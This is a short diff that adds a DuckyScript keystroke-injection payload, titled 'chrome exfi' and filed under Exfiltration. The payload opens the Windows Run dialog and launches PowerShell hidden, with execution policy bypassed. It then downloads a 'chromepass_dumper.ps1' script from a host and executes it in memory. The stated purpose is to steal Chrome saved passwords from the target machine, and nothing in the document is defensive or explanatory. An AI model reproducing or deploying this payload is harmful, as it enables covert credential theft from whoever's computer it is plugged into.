@@ -1,1 +1,11 @@
-powershell -W Hidden -Exec Bypass iwr 127.0.0.1/chromepass_dumper.ps1|iex
+REM Title: chrome exfi
+REM Author: bitbytebandit
+REM Description: idk
+REM Target: Windows
+REM Version: 1.0
+REM Category: Exfiltration
+
+GUI r
+DELAY 250
+STRING powershell -W Hidden -Exec Bypass iwr 127.0.0.1/chromepass_dumper.ps1|iex
+ENTER
